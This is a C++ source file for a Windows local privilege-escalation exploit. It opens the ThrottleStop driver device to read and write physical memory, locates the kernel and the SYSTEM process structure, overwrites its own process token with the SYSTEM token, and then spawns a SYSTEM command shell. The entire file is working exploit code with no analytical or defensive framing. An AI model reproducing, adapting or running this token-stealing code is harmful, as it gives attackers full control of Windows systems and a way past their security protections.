#include "token_stealer.h"

// Runs the physical memory token swap routine and launches a command shell.
int main() {
    printf("[*] Starting ThrottleStop Token Stealing\n");

    hDriver = CreateFileW(L"\\\\.\\ThrotleStop", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Device opened.\n");

    uint64_t ntBase = GetKernelBase();
    if (!ntBase) {
        printf("[-] Failed to get kernel base. Run as Admin.\n");
        return 1;
    }
    printf("[+] ntoskrnl base: 0x%llx\n", ntBase);

    uint64_t psInitialVA = GetPsInitialSystemProcessVA(ntBase);
    if (!psInitialVA) {
        printf("[-] Failed to resolve PsInitialSystemProcess.\n");
        return 1;
    }
    printf("[+] PsInitialSystemProcess VA: 0x%llx\n", psInitialVA);

    uint64_t psInitialPA = 0;
    if (!GetV2PTranslation(psInitialVA, &psInitialPA)) {
        printf("[-] Superfetch translation failed.\n");
        return 1;
    }
    printf("[+] PsInitialSystemProcess PA: 0x%llx\n", psInitialPA);

    uint64_t systemEprocess = 0;
    if (!ReadPhysical(psInitialPA, &systemEprocess, 8)) {
        printf("[-] Failed to read System EPROCESS pointer.\n");
        return 1;
    }
    printf("[+] System EPROCESS: 0x%llx\n", systemEprocess);

    uint64_t systemEprocessPA = 0;
    if (!GetV2PTranslation(systemEprocess, &systemEprocessPA)) {
        printf("[-] Failed to translate EPROCESS VA.\n");
        return 1;
    }
    printf("[+] System EPROCESS PA: 0x%llx\n", systemEprocessPA);

    uint64_t systemToken = 0;
    if (!ReadPhysical(systemEprocessPA + OFFSET_TOKEN, &systemToken, 8)) {
        printf("[-] Failed to read System Token.\n");
        return 1;
    }
    printf("[+] System Token: 0x%llx\n", systemToken);



    printf("[*] Finding my own process by scanning the map for our EPROCESS...\n");
    DWORD myPid = GetCurrentProcessId();
    uint64_t myEprocessVA = 0;
    uint64_t myEprocessPA = 0;

    uint64_t currentEprocess = systemEprocess;
    for (int i = 0; i < 512; i++) {
        uint64_t pidPA = 0;
        if (!GetV2PTranslation(currentEprocess + OFFSET_PID, &pidPA)) break;

        uint64_t currentPid = 0;
        ReadPhysical(pidPA, &currentPid, 8);

        if ((uint32_t)currentPid == myPid) {
            myEprocessVA = currentEprocess;
            printf("[+] Found My EPROCESS VA: 0x%llx\n", myEprocessVA);
            break;
        }

        uint64_t flinkPA = 0;
        if (!GetV2PTranslation(currentEprocess + OFFSET_LINKS, &flinkPA)) break;

        uint64_t nextFlink = 0;
        ReadPhysical(flinkPA, &nextFlink, 8);

        currentEprocess = nextFlink - OFFSET_LINKS;
        if (currentEprocess == systemEprocess) break;
    }

    if (!myEprocessVA) {
        printf("[-] Could not find My process using current offsets (0x1d0, 0x1d8).\n");
        printf("[-] Trying fallback: Scanning for unique PID...\n");

        for (auto const& pair : g_va_to_pa) {
            uint64_t va = pair.first;
            uint64_t pa = pair.second;

            uint64_t val = 0;
            if (ReadPhysical(pa, &val, 8)) {
                if ((uint32_t)val == myPid) {
                    uint64_t potentialEprocess = va - OFFSET_PID;
                    uint64_t potentialTokenPA = 0;

                    if (GetV2PTranslation(potentialEprocess + OFFSET_TOKEN, &potentialTokenPA)) {
                        uint64_t potentialToken = 0;
                        if (ReadPhysical(potentialTokenPA, &potentialToken, 8)) {
                            if ((potentialToken & 0xFFFF000000000000) == 0xFFFF000000000000) {
                                myEprocessVA = potentialEprocess;
                                printf("[+] Found our EPROCESS via scan: 0x%llx\n", myEprocessVA);
                                break;
                            }
                        }
                    }
                }
            }
        }
    }

    if (!myEprocessVA) {
        printf("[-] Failed to find My EPROCESS. Offsets might be wrong.\n");
        return 1;
    }

    if (!GetV2PTranslation(myEprocessVA, &myEprocessPA)) {
        printf("[-] Failed to translate My EPROCESS to PA.\n");
        return 1;
    }

    uint64_t myTokenPA = myEprocessPA + OFFSET_TOKEN;
    uint64_t oldToken = 0;
    ReadPhysical(myTokenPA, &oldToken, 8);

    uint64_t newToken = (systemToken & ~0xFULL) | (oldToken & 0xFULL);

    printf("[*] Overwriting My token (Old: 0x%llx -> New: 0x%llx)...\n", oldToken, newToken);
    if (WritePhysical(myTokenPA, &newToken, 8)) {
        printf("[+] Token overwritten!\n");
        system("cmd.exe");
    }
    else {
        printf("[-] Write failed.\n");
    }

    printf("[*] Done.\n");

    CloseHandle(hDriver);
    return 0;
}